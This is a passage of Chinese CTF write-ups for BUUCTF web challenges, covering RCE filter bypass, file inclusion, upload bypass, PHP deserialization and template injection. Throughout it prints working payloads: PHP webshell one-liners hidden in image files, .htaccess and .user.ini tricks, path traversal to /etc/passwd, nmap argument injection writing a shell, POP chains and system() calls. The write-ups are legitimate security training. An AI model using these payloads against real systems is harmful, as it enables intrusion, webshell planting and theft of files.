id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="**[极客大挑战 2019]RCE ME"></a>**[极客大挑战 2019]RCE ME</h3><p>这道题第一眼想到的是无字母数字rce异或绕过，但测试了一下发现没反应，看了其他师傅博客说过滤了system、exec、shell_exec等命令执行函数</p><p>这种题的操作一般是这样的，先考虑取反绕过：</p><p><strong>url编码取反绕过</strong> ：就是我们将php代码url取反后编码，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过。</p><p>即，对查询语句取反，然后编码。在编码前加上~进行取反，括号没有被过滤，不用取反。</p><p>先构造一个Payload看看phpinfo，看一下PHP版本以及禁用函数：</p><pre><code>&lt;?php error_reporting(0);$a=&#39;phpinfo&#39;;$b=urlencode(~$a);echo $b; ?&gt;</code></pre><p>然后传入code&#x3D;(~%8F%97%8F%96%91%99%90)();</p><img src="/2023/08/03/buuctf/213221.png" class=""><p>可以看到禁用了很多函数</p><p>我们构造一条代码来连接蚁剑</p><pre><code>&lt;?php error_reporting(0);$a=&#39;assert&#39;;$b=urlencode(~$a);echo $b;echo &quot;&lt;br&gt;&quot;;$c=&#39;(eval($_POST[test]))&#39;;$d=urlencode(~$c);echo $d;?&gt;//%9E%8C%8C%9A%8D%8B//%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8B%9A%8C%8B%A2%D6%D6</code></pre><p>然后拼接为 <code>assert（eval($_POST[test])）</code></p><pre><code>?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6);</code></pre><p>在这里，我们不能直接使用eval 因为 eval并不是php函数 所以为我们无法通过变量函数的方法进行调用。<br>在这里，我们使用 assert 来构造，但由于php版本问题，我们并不能直接构造&lt;?php assert($_POST[‘a’]);&gt;,我们需要调用eval拼接为 assert(eval($_POST[test]))</p><img src="/2023/08/03/buuctf/220613.png" class=""><p>发现一个flag文件（空的），一个readflag文件，需要执行readflag才能得到flag</p><img src="/2023/08/03/buuctf/221117.png" class=""><p>1、借助蚁剑插件绕过disable_functions</p><img src="/2023/08/03/buuctf/223757.png" class=""><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>进去之后发现有个tips链接，点击链接发现是一个get传参，参数中也提示了flag.php</p><p>直接在get里面传参，用php:&#x2F;&#x2F;filter协议：</p><pre><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>base64解码后果然有flag。</p><h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>看源代码提示我们有个source.php，进入后看源码：</p><img src="/2023/08/03/buuctf/221220.png" class=""><p>然后看到提示hint.php，访问后得到flag在ffffllllaaaagggg下，然后开始审计一波代码。</p><p>首先它先判定了传入的是不是空或者是不是字符串，然后进行了三次白名单判断。里面涉及到mb_substr(),mb_strpos(),urldecode()三个函数。</p><p>**mb_substr(str,start,length,encoding):**返回从start位置开始的长度为length的字符串。</p><p>**mb_strpos(str,find_str,offset,encoding):**返回str中从offset(默认为0)开始第一次出现find_str的位置。</p><p>根据代码分析得到，在第一次$_page取的是从0开始到第一次出现？之间的字符串，所以我们在参数中传入一个？绕过白名单。</p><pre><code>payload:http://03b2cc85-7af4-439b-a06e-41da80ff6505.node3.buuoj.cn/index.php?file=hint.php?../../../../../ffffllllaaaagggg </code></pre><p>tips:include函数有这么一个神奇的功能：以字符‘&#x2F;’分隔（而且不计个数），若是在前面的字符串所代表的文件无法被PHP找到，则PHP会自动包含‘&#x2F;’后面的文件——注意是最后一个‘&#x2F;’。</p><h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p>这道题很皮</p><p>打开题目说“你想知道蒋璐源的秘密么？”，先看源码，有个Archive_room.php，进去之后又有个SECRET，点击之后跳转到新页面，显示“查阅结束没看清么？回去再仔细看看吧”，我们试试退回到上一步然后抓包，果然能抓到东西：</p><img src="/2023/08/03/buuctf/193820.png" class=""><p>访问secr3t.php</p><img src="/2023/08/03/buuctf/194100.png" class=""><p><strong>strstr(string <code>$haystack</code>, string <code>$needle</code>, bool <code>$before_needle</code> &#x3D; <code>false</code>): string|false</strong></p><p>返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到 <code>haystack</code> 结尾的字符串。</p><p>该函数区分大小写。如果想要不区分大小写，请使用 stristr()。</p><p>可以看到，过滤规则很简单，而且提示的flag.php没有被过滤，那我们应该会想到flag应该不会在flag.php里，但先包含flag.php看看</p><img src="/2023/08/03/buuctf/194620.png" class=""><p>没显示flag,我就在这里。。。可能flag被当作变量了,用php:&#x2F;&#x2F;filter看看</p><pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p>解码后出现了flag变量</p><h3 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h3><p>主页上有WOOFERS和MEOWERS两个选项，点击后发现url跟着变化，猜测可能是sql注入，试了一下?category&#x3D;woofers“</p><img src="/2023/08/03/buuctf/174823.png" class=""><p>有include()，原来是文件包含，但是我们还可以看到，它自动加上了.php，我们试一下让它包含flag，但是我们可以看到”Sorry, we currently only support woofers and meowers“</p><p>试一下?category&#x3D;woofers&#x2F;..&#x2F;flag：</p><p>{ % asset_img 175749.png%}</p><p>可以看到，flag.php应该是被包含了进去，但flag没有显示，可能是没有输出或者被注释了</p><p>这里我们可以套用伪协议：</p><pre><code>?category=php://filter/convert.base64-encode/woofers/resource=flag</code></pre><h3 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h3><p>进去后一堆乱码，也没有什么提示，用dirsearch扫一下：</p><img src="/2023/08/03/buuctf/224819.png" class=""><p>可以直接进去phpmyadmin：</p><img src="/2023/08/03/buuctf/221034.png" class=""><p>数据库里没有东西，这里的利用点是phpmyadmin4.8.1版本存在任意文件读取漏洞：</p><p><a href="https://www.jianshu.com/p/fb9c2ae16d09">https://www.jianshu.com/p/fb9c2ae16d09</a></p><p>payload</p><pre><code>target=db_datadict.php%253f/../../../../../../../../etc/passwd</code></pre><img src="/2023/08/03/buuctf/191534.png" class=""><p>尝试读取flag:</p><pre><code>target=db_datadict.php%253f/../../../../../../../../flag</code></pre><p>成功</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>通过测试发现这道题检测了文件后缀，文件类型和文件内容。</p><p>文件后缀我们用.phtml绕过，文件类型我们修改为Content-Type：image&#x2F;jpeg，文件内容它检测到了”&lt;?”,可以用&lt;script language&#x3D;”php”&gt;eval($_POST[shell])&lt;&#x2F;script&gt;绕过，还需要加上文件头GIF89a</p><img src="/2023/08/03/buuctf/210543.png" class=""><h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><p>上来就是一个前端js验证，burp抓包修改后缀：</p><img src="/2023/08/03/buuctf/215809.png" class=""><p>发现response是nonono bad file，试试.phtml后缀</p><img src="/2023/08/03/buuctf/220018.png" class=""><p>成功</p><h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p>这道题很迷，测了很多东西都过不去，甚至最后测一张普通的图片都过不去，最后才在源代码中发现对上传内容长度有限制：$_FILES[“uploaded”][“size”] &lt; 2048。</p><p>那么重新按常规思路走：</p><p>首先修改content-Type必须为image&#x2F;jpeg才可以，然后发现后缀名也不能含有ph，</p><img src="/2023/08/03/buuctf/225239.png" class=""><p>还是不行，修改一句话为&lt;script language&#x3D;”php”&gt;eval($_REQUEST[shell])&lt;&#x2F;script&gt;成功绕过。</p><p>既然只上传了一个jpg文件，那么还需要上传一个.htaccess</p><p>.htaccess的方法：</p><pre><code>方法一：只将“haha.png”文件当成php文件执行&lt;FilesMatch &quot;haha.png&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;方法二：这里时是要包含所有文件带有haha的文件（只要文件名里面有haha都可以），都会被当成php代码执行&lt;FilesMatch &quot;haha&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;方法三：这种方法时，后面的.png或者.jpg文件能被当成php代码执行，如果想换成别的改扩展名就可以AddType application/x-httpd-php .pngAddType application/x-httpd-php .jpg</code></pre><p>最后可以使用蚁剑连接</p><h3 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h3><p>测了一下发有黑名单过滤和MIME信息过滤，那就常规操作，上传个png木马，再传个.htaccess文件，将Content-Type修改为image&#x2F;png就行。</p><p>要注意的是，这题用不了system等函数了，但可以用show_source()。</p><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>打开后可以看到是一个文件上传的题目，我们先上传个一句话，测试过程中发现这道题限制了文件后缀，文件头，还过滤了&lt;?，</p><p>所以我们需要上传一个.png的图片马，内容如下：</p><pre><code>GIF89a&lt;script language=&quot;php&quot;&gt;eval($_POST[shell])&lt;/script&gt;</code></pre><p>这道题测试了一下虽然可以成功上传.htaccess文件，但不能利用，可能是没有开启AllowOverride All，所以只能使用.user.ini文件（前提是含有.user.ini的文件夹下需要有正常的php文件）</p><pre><code>GIF89aauto_prepend_file=haha.png</code></pre><p>最后需要访问index.php</p><h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><img src="/2023/08/03/buuctf/182338.png" class=""><p>这道题的重点在于这两个函数：</p><pre><code>escapeshellarg()escapeshellcmd()</code></pre><p>参考文章：<a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p><pre><code>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)escapeshellcmd — shell 元字符转义功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。反斜线（\）会在以下字符之前插入：&amp;#;`|\?~&lt;&gt;^()[]&#123;&#125;$\, \x0A 和 \xFF。    ’ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</code></pre><img src="/2023/08/03/buuctf/183949.png" class=""><p>然后具体这道题的利用点在nmap这里，在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p><pre><code>?host=&#39; &lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php &#39;</code></pre><p>注意事项：</p><p><strong>两边加单引号</strong>是因为，不加的话，两个函数执行后会变成：</p><pre><code>&#39;&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php&#39;</code></pre><p><strong>引号旁边加空格</strong>是因为，如果不加，当两个函数执行后就会生成：</p><pre><code>&#39;&#39;\\&#39;&#39;\&lt;\?php @eval\(\$_POST\[&quot;hack&quot;\]\)\;\?\&gt; -oG hack.php&#39;\\&#39;&#39;&#39;</code></pre><p>注意：在bash中，单引号是全引用，被单引号括起的内容不管是常量还是变量都不会发生替换。所以最终就会是</p><pre><code>\&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php\\</code></pre><h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>首页给出了提示，要找备份文件</p><p>常见的备份文件后缀名：.git .svn .swp .~ .bak .bash_history</p><p>用dirmap可以扫出<a href="http://www.zip,下载下来包括以下文件index.php/">www.zip，下载下来包括以下文件index.php</a> flag.php index.js class.php style.css</p><p>index.php中有入口：</p><pre><code>include &#39;class.php&#39;;$select = $_GET[&#39;select&#39;];$res=unserialize(@$select);</code></pre><p>很明显是php反序列化，看class.php：</p><pre><code>class Name&#123;    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password)&#123;        $this-&gt;username = $username;        $this-&gt;password = $password;    &#125;    function __wakeup()&#123;        $this-&gt;username = &#39;guest&#39;;    &#125;    function __destruct()&#123;        if ($this-&gt;password != 100) &#123;            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        &#125;        if ($this-&gt;username === &#39;admin&#39;) &#123;            global $flag;            echo $flag;        &#125;else&#123;            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        &#125;    &#125;&#125;?&gt;</code></pre><p>在__destruct()中，我们需要让password弱相等于100，让username等于admin才能得到flag，但是这里有个__wakeup()魔术方法，它在反序列化时先执行，我们需要绕过这个魔术方法</p><p><strong>这里存在一个CVE漏洞：当成员属性数目大于实际数目时可绕过__wakeup()方法</strong></p><p>我们先生成序列化对象：</p><pre><code>&lt;?phpclass Name&#123;    private $username;    private $password;    public function __construct()&#123;        $this-&gt;username=&#39;admin&#39;;        $this-&gt;password=100;    &#125;&#125;echo serialize(new Name());?&gt;</code></pre><pre><code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code></pre><p>再将成员属性数目改成3，并且在私有属性中添加上%00</p><pre><code>O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></pre><h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h3><p>代码审计一下发现__destruct()里的$op与2是强比较，process()函数里的是若比较，所以我们可以</p><p>将op实例化为数字2进行绕过，然后将filename实例化为”.&#x2F;flag.php”。</p><p>但是这里的变量属性是protected，序列化后会出现%00不可见字符，通过不了is_valid()函数</p><p><strong>绕过方法：</strong>因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符</p><pre><code>&lt;?phpclass FileHandler&#123;    public $op = &quot;2&quot;;    public $filename = &quot;./flag.php&quot;;&#125;echo urlencode(serialize(new FileHandler()));</code></pre><pre><code>payload:O%3A11%3A%22FileHandler%22%3A2%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A10%3A%22.%2Fflag.php%22%3B%7D</code></pre><p>还可以使用伪协议：</p><pre><code>&lt;?phpclass FileHandler&#123;    public $op = 2;    public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;echo urlencode(serialize(new FileHandler()));</code></pre><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>第一层绕过：</p><pre><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))</code></pre><p>这里就要用到伪协议，php:&#x2F;&#x2F;input和data都可以</p><pre><code>?text=data://text/plain,welcome to the zjctf</code></pre><p>然后：</p><pre><code>else&#123;        include($file);  //useless.php        $password = unserialize($password);        echo $password;    &#125;</code></pre><p>意思是在useless.php中反序列化</p><p>这里可以用伪协议去读取useless.php:</p><pre><code>?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p>{ % asset_img 101403.png%}</p><p>序列化：</p><pre><code>&lt;?phpclass Flag &#123;    public $file=&#39;flag.php&#39;;&#125;echo serialize(new Flag());</code></pre><p>最终payload：</p><pre><code>?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></pre><h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p>打开后页面一直在闪，找了一下没有什么信息，抓包：</p><img src="/2023/08/03/buuctf/122234.png" class=""><p>这里自动提交了两个参数func和p，猜测源码里应该有call_user_func()函数，用file_get_contents测试一下：</p><pre><code>func=file_get_contents&amp;p=index.php</code></pre><p>输出了index.php源码：</p><p>{ % asset_img 122921.png%}</p><p>代码审计发现我们可以利用反序列化</p><p>序列化：</p><pre><code>&lt;?phpclass Test&#123;    public $p=&quot;find / -name flag*&quot;;    public $func=&quot;system&quot;;&#125;echo serialize(new Test());//O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><p>传参后：</p><img src="/2023/08/03/buuctf/132611.png" class=""><p>读文件&#x2F;tmp&#x2F;flagoefiu4r93：</p><pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><pre><code>class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file=&#39;index.php&#39;)&#123;        $this-&gt;source = $file;        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    @unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;    $a=new Show;    highlight_file(__FILE__);&#125;</code></pre><p>这道题的函数调用顺序是</p><p><code>__wakeup()</code>-&gt;<code>__toString()</code>-&gt;<code>__get()</code>-&gt;<code>__invoke()</code>-&gt;<code>append</code>-&gt;文件包含</p><p>最主要的一点是调用Show类中的__wakeup()函数后要再调用一次Show类中的__tostring函数</p><p>payload</p><pre><code>&lt;?phpclass Modifier&#123;    protected $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;class Test&#123;    public $p;&#125;class Show&#123;    public $source;    public $str;&#125;$a=new Show();$a-&gt;source=new Show();$a-&gt;source-&gt;str=new Test();$a-&gt;source-&gt;str-&gt;p=new Modifier();echo serialize($a);//O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;N;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:6:&quot;%00*%00var&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;s:3:&quot;str&quot;;N;&#125;</code></pre><p>注意加%00</p><h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h3><pre><code>&lt;?php$function = @$_GET[&#39;f&#39;];function filter($img)&#123;    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);&#125;if($_SESSION)&#123;    unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;extract($_POST);if(!$function)&#123;    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;&#125;if(!$_GET[&#39;img_path&#39;])&#123;    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);&#125;else&#123;    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#39;highlight_file&#39;)&#123;    highlight_file(&#39;index.php&#39;);&#125;else if($function == &#39;phpinfo&#39;)&#123;    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!&#125;else if($function == &#39;show_image&#39;)&#123;    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));&#125;</code></pre><p>题目提示我们访问phpinfo：</p><img src="/2023/08/03/buuctf/222451.png" class=""><p>应该就是让我们去dog3_f1ag.php里面去找flag</p><p>而这道题的难点就是这里</p><pre><code>if(!$_GET[&#39;img_path&#39;])&#123;    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);&#125;else&#123;    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;</code></pre><p>而且最后面只进行了base64解码，所以在这段代码中我们不可能将img设为d0g3_f1ag.php</p><p>看了下别人wp，这又是一道反序列化字符串逃逸题，看来还是做题太少，想不起来字符串逃逸</p><p>代码中有个extract($_POST)，这也是我们传参的突破口</p><p>用extract函数对数组变量覆盖时，之前的变量会全部消失，例如：</p><pre><code>&lt;?php$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;var_dump($_SESSION);echo &quot;&lt;br/&gt;&quot;;extract($_POST);var_dump($_SESSION);//array(2) &#123; &#39;user&#39; =&gt; string(5) &quot;guest&quot; &#39;function&#39; =&gt; NULL &#125;//&#123; &#39;flag&#39; =&gt; string(3) &quot;123&quot; &#39;user&#39; =&gt; string(5) &quot;admin&quot; &#125;</code></pre><p>当我们传入SESSION[flag]&#x3D;123和SESSION[user]&#x3D;admin时，$SESSION[“user”]和$SESSION[‘function’] 全部会消失。只剩下_SESSION[flag]&#x3D;123和_SESSION[user]&#x3D;admin</p><p>然后就是字符串逃逸，反序列化字符串逃逸有两种方式，一种是字符串变多，一种是变少，常见的是字符串变多，而这道题是字符串变少</p><p>字符串逃逸又分为两种形式，键名逃逸和键值逃逸</p><p><strong>1、键值逃逸</strong></p><p>payload</p><pre><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=f&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:3:&quot;dfd&quot;;s:2:&quot;fd&quot;;&#125;//后面添加s:3:&quot;dfd&quot;;s:2:&quot;fd&quot;;是因为题目在序列化之前添加了一次img，使序列化后的属性数量变为3</code></pre><p>然后题目又让我们去&#x2F;d0g3_fllllllag去找flag</p><pre><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=f&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:3:&quot;dfd&quot;;s:2:&quot;fd&quot;;&#125;</code></pre><p><strong>2、键名逃逸</strong></p><p>原理相同</p><pre><code>_SESSION[user]=adddd&amp;_SESSION[flagflagflag]=fddd&quot;;s:3:&quot;fdd&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code></pre><h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h3><img src="/2023/08/03/buuctf/195713.png" class=""><p>先传个参过去：</p><pre><code>?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:15:&quot;$_POST[&quot;shell&quot;]&quot;;s:1:&quot;b&quot;;s:4:&quot;eval&quot;;&#125;</code></pre><p>发现会出错网页没法运行，看了其他师傅wp，这里要用assert</p><p>assert()可以将整个字符串参数当作php参数执行，<br>而类似的eval()函数是执行合法的php代码，eval()里的引号必须是双引号，因为单引号不能解析字符串里的变量$str，且必须以分号结尾，函数调用除外。</p><p>payload</p><pre><code>O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;或O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;eval($_POST[&quot;shell&quot;])&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</code></pre><p>并且这道题屏蔽了system</p><h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><img src="/2023/08/03/buuctf/201457.png" class=""><p>爆破和注入好像都不行，扫描目录试一下：</p><h1 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h1><h3 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h3><p>首先可以利用php伪协议绕过判断并查看题目中提示的next.php的源码</p><pre><code>?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</code></pre><img src="/2023/08/03/buuctf/210024.png" class=""><p>payload:</p><pre><code>/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&quot;ls&quot;);</code></pre><p>这里的PHP版本是：<code>5.6.40</code>，<code>preg_replace()+/e</code>存在代码执行漏洞</p><p>具体参考文章：</p><p><a href="https://www.xinyueseo.com/websecurity/158.html">https://www.xinyueseo.com/websecurity/158.html</a></p><p><a href="https://www.cnblogs.com/sipc-love/p/14289984.html">https://www.cnblogs.com/sipc-love/p/14289984.html</a></p><h1 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h1><h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>打开后有三个超链接：</p><p>{ % asset_img 173958.png %}</p><p>内容分别是：</p><pre><code>flag in /fllllllllllllagrendermd5(cookie_secret+md5(filename))</code></pre><p>当我们分别去点击这些链接的时候发现url结构都相同：</p><p>{ % asset_img 174339.png %}</p><p>那么我们可以猜到我们想要的payload应该是&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;md5(cookie_secret+md5(“&#x2F;fllllllllllllag”))</p><p>所以问题的关键是这个cookie_secret，去百度了一下，发现了一篇现成的文章：</p><p><a href="http://www.manongjc.com/detail/25-hjhhgdoihywitdw.html">http://www.manongjc.com/detail/25-hjhhgdoihywitdw.html</a></p><img src="/2023/08/03/buuctf/174845.png" class=""><p>其实这里的**&#x2F;error?msg&#x3D;**我们点击链接的时候随便破坏一下就可以得到&#x2F;error?msg&#x3D;Error，然后成功得到cookie_secret:</p><img src="/2023/08/03/buuctf/175722.png" class=""><p>最后进行md5加密后即可得到filehash</p><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>源码中有“The mystery of ip”,主页左上角有Flag菜单选项，点击后发现会显示自己的ip，Hint菜单的源码中提示“Do you know why i know your ip?”，联想到X-Forward-For，抓包传参：</p><img src="/2023/08/03/buuctf/172033.png" class=""><p>果然我们可以控制XFF,然后不知道干什么，看别人wp发现是smart模板注入，我们直接传参：</p><pre><code>&#123;system(&quot;ls&quot;)&#125;&#123;system(&quot;cat /flag&quot;)&#125;</code></pre><h3 id="BJDCTF2020-Cookie-is-so-stable"><a 